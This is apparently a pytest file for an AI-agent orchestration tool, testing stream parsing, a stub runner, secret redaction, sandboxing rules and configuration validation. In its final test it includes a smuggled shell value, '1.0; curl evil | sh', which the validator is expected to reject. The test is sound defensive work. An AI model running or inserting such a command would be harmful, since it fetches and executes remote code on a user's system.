"""What the factory reads from a headless agent run."""
import json

from factory.harness.claude import read_stream


def line(**message):
    return json.dumps(message)


def test_stream_reports_result_skills_and_tool_calls():
    out = "\n".join([
        line(type="system", subtype="init"),
        line(type="assistant", message={"content": [{"type": "tool_use", "name": "Skill", "input": {"skill": "superpowers:test-driven-development"}}]}),
        line(type="assistant", message={"content": [{"type": "text", "text": "working"},
                                                     {"type": "tool_use", "name": "Bash", "input": {"command": "ls"}}]}),
        line(type="assistant", message={"content": [{"type": "tool_use", "name": "Agent", "input": {"prompt": "review"}}]}),
        line(type="assistant", message={"content": [{"type": "tool_use", "name": "Skill", "input": {"skill": "simplify"}}]}),
        line(type="assistant", message={"content": [{"type": "tool_use", "name": "Skill", "input": {"skill": "simplify"}}]}),
        "not json at all",
        line(type="result", subtype="success", is_error=False, num_turns=7, total_cost_usd=0.12, result="done"),
    ])
    result, skills, tool_calls, subagents = read_stream(out)
    assert result["total_cost_usd"] == 0.12 and result["num_turns"] == 7
    assert skills == ["superpowers:test-driven-development", "simplify"]      # each once, in order of first use
    assert tool_calls == 5 and subagents == 1


def test_stream_without_a_result_is_empty():
    assert read_stream("garbage\n")[0] == {}


def test_stream_survives_lines_whose_message_is_text():
    # Seen on the self-hosted Mac: a line whose "message" is a plain string stopped the ticket at intake.
    out = "\n".join([
        '{"type":"system","subtype":"api_retry","message":"Overloaded, retrying"}',
        '{"type":"error","message":"rate limited"}',
        '{"type":"result","subtype":"success","is_error":false,"result":"ok"}',
    ])
    assert read_stream(out)[0]["result"] == "ok"


# ---- the real runner against a stand-in for the claude command --------------------

STUB = r'''#!/usr/bin/env python3
import json, sys, time
prompt = sys.stdin.read()
def say(**m): print(json.dumps(m), flush=True)
say(type="system", subtype="init")
say(type="assistant", message={"content": [{"type": "tool_use", "name": "Bash", "input": {"command": "python3 -m pytest -q\nsecond line"}}]})
say(type="assistant", message={"content": [{"type": "tool_use", "name": "Edit", "input": {"file_path": sys.argv[-1] + "/src/a.py"}}]})
say(type="assistant", message={"content": [{"type": "tool_use", "name": "Skill", "input": {"skill": "simplify"}}]})
if "SLEEP" in prompt: time.sleep(30)
if "FAIL" in prompt:
    print("something broke badly", file=sys.stderr); sys.exit(3)
say(type="result", subtype="success", is_error=False, num_turns=4, total_cost_usd=0.25, result="done: " + prompt[:5])
'''


def run_stub(tmp_path, prompt, minutes=1):
    from factory.agent import run_agent
    stub = tmp_path / "claude-stub"
    stub.write_text(STUB)
    stub.chmod(0o755)
    cfg = {"agent": {"command": str(stub)}, "roles": {"implementer": {"tools": "read", "timeout_minutes": minutes}}}
    seen = []
    # the stub takes the working directory from its last argument, as --add-dir passes it
    result = run_agent(cfg, {}, "implementer", prompt, tmp_path, model="m", effort="low", budget_usd=1.0,
                       dirs=[tmp_path], plugin_dirs=[], on_tool=lambda tool, text: seen.append((tool, text)))
    return result, seen


def test_runner_reports_tools_as_they_happen(tmp_path, monkeypatch):
    monkeypatch.delenv("FACTORY_SANDBOXED", raising=False)
    result, seen = run_stub(tmp_path, "hello")
    assert result.ok and result.text == "done: hello" and result.cost_usd == 0.25 and result.turns == 4
    assert result.tools == {"Bash": 1, "Edit": 1, "Skill": 1} and result.skills == ["simplify"]
    assert seen[0] == ("Bash", "python3 -m pytest -q") and seen[2] == ("Skill", "simplify")


def test_runner_reports_a_failure_with_its_message(tmp_path):
    result, _ = run_stub(tmp_path, "FAIL")
    assert not result.ok and "something broke badly" in result.error and result.tools["Bash"] == 1


def test_runner_stops_a_run_that_takes_too_long(tmp_path):
    result, _ = run_stub(tmp_path, "SLEEP", minutes=0.03)
    assert not result.ok and "timed out" in result.error


def test_stream_keeps_the_whole_session_in_order():
    from factory.harness.claude import Stream
    stream = Stream("/work")
    seen = []
    for message in [
        dict(type="assistant", message={"content": [{"type": "text", "text": "I will look at the code."},
                                                     {"type": "tool_use", "name": "Read", "input": {"file_path": "/work/todo/cli.py"}}]}),
        dict(type="user", message={"content": [{"type": "tool_result", "content": [{"type": "text", "text": "def main(): ..."}]}]}),
        dict(type="user", message={"content": [{"type": "tool_result", "content": "boom", "is_error": True}]}),
        dict(type="user", message={"content": "a plain user message is not a tool result"}),
    ]:
        seen += stream.feed(json.dumps(message))
    assert [e["type"] for e in seen] == ["text", "tool", "result", "result"]
    assert seen[1]["tool"] == "Read" and seen[1]["text"] == "todo/cli.py"
    assert seen[2]["text"] == "def main(): ..." and seen[3]["error"] is True


def test_secrets_never_reach_the_written_session(monkeypatch):
    from factory.agent import redact
    monkeypatch.setenv("CLAUDE_CODE_OAUTH_TOKEN", "sk-ant-oat01-secretsecret")
    assert redact("env says CLAUDE_CODE_OAUTH_TOKEN=sk-ant-oat01-secretsecret here") == \
        "env says CLAUDE_CODE_OAUTH_TOKEN=[entfernt] here"


def test_runner_hands_over_every_event(tmp_path, monkeypatch):
    from factory.agent import run_agent
    monkeypatch.delenv("FACTORY_SANDBOXED", raising=False)
    stub = tmp_path / "claude-stub"
    stub.write_text(STUB)
    stub.chmod(0o755)
    cfg = {"agent": {"command": str(stub)}, "roles": {"implementer": {"tools": "read", "timeout_minutes": 1}}}
    seen = []
    run_agent(cfg, {}, "implementer", "hello", tmp_path, model="m", effort="low", budget_usd=1.0, dirs=[tmp_path],
              plugin_dirs=[], on_event=seen.append)
    assert [e["type"] for e in seen] == ["tool", "tool", "tool"] and seen[0]["input"].startswith('{"command"')


def test_stream_reports_context_and_subscription():
    from factory.harness.claude import Stream
    stream = Stream()
    for message in [
        dict(type="rate_limit_event", rate_limit_info={"unifiedWindows": {"seven_day": {"utilization": 0.45, "resetsAt": 1795028400}}}),
        dict(type="assistant", message={"usage": {"input_tokens": 2, "cache_read_input_tokens": 9000,
                                                  "cache_creation_input_tokens": 7000, "output_tokens": 16}, "content": []}),
        dict(type="assistant", parent_tool_use_id="toolu_1",                    # a subagent has its own context
             message={"usage": {"input_tokens": 900000, "output_tokens": 1}, "content": []}),
        dict(type="assistant", message={"usage": {"input_tokens": 2, "cache_read_input_tokens": 16193,
                                                  "cache_creation_input_tokens": 136, "output_tokens": 4}, "content": []}),
        dict(type="rate_limit_event", rate_limit_info={"unifiedWindows": {"seven_day": {"utilization": 0.47, "resetsAt": 1795028400}}}),
    ]:
        stream.feed(json.dumps(message))
    assert stream.context_peak == 16335
    assert stream.subscription == {"seven_day": {"start": 0.45, "end": 0.47, "resets_at": 1795028400}}


# ---- harnesses ----------------------------------------------------------------

def test_roles_run_in_claude_unless_configured_otherwise():
    from factory import harness
    cfg = {"agent": {}, "roles": {"planner": {}, "judge": {"harness": "claude"}}}
    assert harness.for_role(cfg, "planner").name == "claude" and harness.used(cfg) == ["claude"]
    assert harness.problems(cfg) == []
    bad = {"agent": {"harness": "nope"}, "roles": {"judge": {"harness": "other"}}}
    assert [line.split(":")[0] for line in harness.problems(bad)] == ["agent.harness", "roles.judge.harness"]


def test_claude_command_keeps_its_flags(tmp_path):
    from factory.harness import Request, get
    req = Request(prompt="p", cwd=tmp_path, model="claude-opus-5-5", effort="high", budget_usd=1.5,
                  fallback="claude-sonnet-5-5", dirs=[tmp_path], tools="write", agent_commands=["npm test"],
                  settings={"setting_sources": "project"})
    cmd = get("claude").argv(req)
    assert cmd[:2] == ["claude", "-p"] and cmd[cmd.index("--max-budget-usd") + 1] == "1.50"
    assert cmd[cmd.index("--fallback-model") + 1] == "claude-sonnet-5-5" and "--strict-mcp-config" in cmd
    assert "Bash(npm test:*)" in cmd and "acceptEdits" in cmd
    req.sandboxed = True
    assert "bypassPermissions" in get("claude").argv(req) and "--allowedTools" not in get("claude").argv(req)


def test_a_harness_without_command_limits_only_runs_sandboxed(tmp_path, monkeypatch):
    from factory import harness
    from factory.agent import run_agent

    class Loose(harness.Harness):
        name, label, capabilities = "loose", "Loose CLI", frozenset()

    monkeypatch.setattr(harness, "_ADAPTERS", {**harness.all_harnesses(), "loose": Loose()})
    monkeypatch.delenv("FACTORY_SANDBOXED", raising=False)
    cfg = {"agent": {"harness": "loose"}, "roles": {"implementer": {"tools": "write", "timeout_minutes": 1}}}
    result = run_agent(cfg, {}, "implementer", "hi", tmp_path, model="m", effort=None, budget_usd=1.0,
                       dirs=[], plugin_dirs=[])
    assert not result.ok and "sandboxed" in result.error and result.harness == "loose"


def test_model_credentials_reach_agents_but_not_checks(monkeypatch):
    from factory import harness
    from factory.agent import clean_env
    monkeypatch.setenv("CLAUDE_CODE_OAUTH_TOKEN", "sk-ant-oat01-secretsecret")
    assert "CLAUDE_CODE_OAUTH_TOKEN" in clean_env({}, {}, harness.get("claude"))
    assert "CLAUDE_CODE_OAUTH_TOKEN" not in clean_env({}, {})


def test_runners_install_the_clis_their_roles_need(monkeypatch):
    from factory import harness

    class Other(harness.Harness):
        name, package = "other", "@example/other-cli"

    monkeypatch.setattr(harness, "_ADAPTERS", {**harness.all_harnesses(), "other": Other()})
    cfg = {"agent": {"version": "2.1.0", "versions": {"other": "0.9.1"}},
           "roles": {"planner": {}, "implementer": {}, "judge": {"harness": "other"}}}
    assert harness.install(cfg, ["planner", "implementer"]) == ["@anthropic-ai/claude-code@2.1.0"]
    assert harness.install(cfg, ["judge"]) == ["@example/other-cli@0.9.1"]
    cfg["roles"]["implementer"]["harness"] = "other"
    cfg["agent"]["versions"] = {}
    assert harness.install(cfg, ["planner", "implementer"]) == ["@anthropic-ai/claude-code@2.1.0", "@example/other-cli@latest"]


def test_a_cli_version_cannot_carry_shell():
    from factory.config import load_defaults, problems
    cfg = load_defaults()
    cfg["agent"]["version"] = "1.0; curl evil | sh"
    assert any(line.startswith("agent.version") for line in problems(cfg))
    cfg["agent"]["version"] = "latest"
    cfg["roles"]["judge"]["harness"] = None          # "wie Standard" from the settings page
    assert problems(cfg) == []
